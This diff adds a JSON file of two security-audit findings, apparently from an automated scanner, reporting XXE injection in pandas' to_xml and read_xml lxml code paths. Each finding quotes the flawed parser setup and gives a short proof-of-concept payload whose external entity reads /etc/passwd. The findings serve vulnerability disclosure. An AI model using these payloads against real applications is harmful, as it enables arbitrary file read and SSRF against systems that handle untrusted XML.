@@ -1,0 +1,32 @@
+[
+  {
+    "finding_id": "d3936d58-33cc-537a-863e-56264b01a39e",
+    "session_id": "ChA2MzdlM2NiM2U5NzA4ZWIyEAgaATAqBG1haW4",
+    "title": "XML External Entity (XXE) Injection in pandas DataFrame.to_xml via lxml parser",
+    "file_path": "/home/jfplante_google_com/repos/h02-pandas_rep1/pandas/io/formats/xml.py",
+    "severity": "HIGH",
+    "confidence": 100,
+    "analysis": "The function `_transform_doc()` in `pandas/io/formats/xml.py` instantiates `lxml.etree.XMLParser` with only the `encoding` parameter. In `lxml`, the `XMLParser` has the parameter `resolve_entities` set to `True` by default. This allows the parser to resolve external entity declarations inside DOCTYPE headers of parsed stylesheet documents.\n\nIf an application uses `DataFrame.to_xml(..., stylesheet=...)` on an untrusted stylesheet path or content, an attacker can supply a malicious stylesheet XML payload referencing external local files (e.g. `file:///etc/passwd` or `file:///windows/win.ini`) or internal network services, leading to XML External Entity (XXE) Injection / Arbitrary File Read / SSRF.\n\nConceptual Exploit Payload:\n```python\nimport pandas as pd\nimport io\n\ndf = pd.DataFrame({'col': [1, 2]})\n\n# Malicious XSLT Stylesheet containing XXE payload:\nxslt_payload = '''\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e\n\u003c!DOCTYPE xsl:stylesheet [\n  \u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e\n]\u003e\n\u003cxsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\u003e\n  \u003cxsl:template match=\"/\"\u003e\n    \u003cout\u003e\u0026xxe;\u003c/out\u003e\n  \u003c/xsl:template\u003e\n\u003c/xsl:stylesheet\u003e'''\n\n# Triggering the XXE vulnerability:\nxml_output = df.to_xml(stylesheet=io.StringIO(xslt_payload))\nprint(xml_output)\n```",
+    "snippet": "        with preprocess_data(handle_data) as xml_data:\n            curr_parser = XMLParser(encoding=self.encoding)\n\n            if isinstance(xml_data, io.StringIO):\n                xsl_doc = fromstring(\n                    xml_data.getvalue().encode(self.encoding), parser=curr_parser\n                )\n            else:\n                xsl_doc = parse(xml_data, parser=curr_parser)",
+    "vuln_type": "XML External Entity (XXE) Injection",
+    "vuln_id": "CWE-611",
+    "status": "OPEN",
+    "start_line": 547,
+    "end_line": 555
+  },
+  {
+    "finding_id": "2ccb94a4-c19e-5d12-b20f-905a221af94c",
+    "session_id": "ChA2MzdlM2NiM2U5NzA4ZWIyEAgaATAqBG1haW4",
+    "title": "XML External Entity (XXE) Injection in pandas.read_xml via lxml parser",
+    "file_path": "/home/jfplante_google_com/repos/h02-pandas_rep1/pandas/io/xml.py",
+    "severity": "HIGH",
+    "confidence": 100,
+    "analysis": "The function `_LxmlFrameParser._parse_doc()` in `pandas/io/xml.py` instantiates `lxml.etree.XMLParser` with only the `encoding` parameter. In `lxml`, the `XMLParser` has the parameter `resolve_entities` set to `True` by default. This allows the parser to resolve external entity declarations inside DOCTYPE headers of parsed XML documents.\n\nIf an application uses `pandas.read_xml(..., parser=\"lxml\")` on untrusted input, an attacker can supply a malicious XML payload referencing external local files (e.g. `file:///etc/passwd` or `file:///windows/win.ini`) or internal network services, leading to XML External Entity (XXE) Injection / Arbitrary File Read / SSRF.\n\nConceptual Exploit Payload:\n```python\nimport pandas as pd\nimport io\n\npayload = '''\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e\n\u003c!DOCTYPE root [\n  \u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e\n]\u003e\n\u003croot\u003e\n  \u003crow\u003e\n    \u003cdata\u003e\u0026xxe;\u003c/data\u003e\n  \u003c/row\u003e\n\u003c/root\u003e'''\n\ndf = pd.read_xml(io.StringIO(payload), parser=\"lxml\")\nprint(df)\n```",
+    "snippet": "        with preprocess_data(handle_data) as xml_data:\n            curr_parser = XMLParser(encoding=self.encoding)\n\n            if isinstance(xml_data, io.StringIO):\n                if self.encoding is None:\n                    raise TypeError(\n                        \"Can not pass encoding None when input is StringIO.\"\n                    )\n\n                document = fromstring(\n                    xml_data.getvalue().encode(self.encoding), parser=curr_parser\n                )\n            else:\n                document = parse(xml_data, parser=curr_parser)",
+    "vuln_type": "XML External Entity (XXE) Injection",
+    "vuln_id": "CWE-611",
+    "status": "OPEN",
+    "start_line": 638,
+    "end_line": 651
+  }
+]
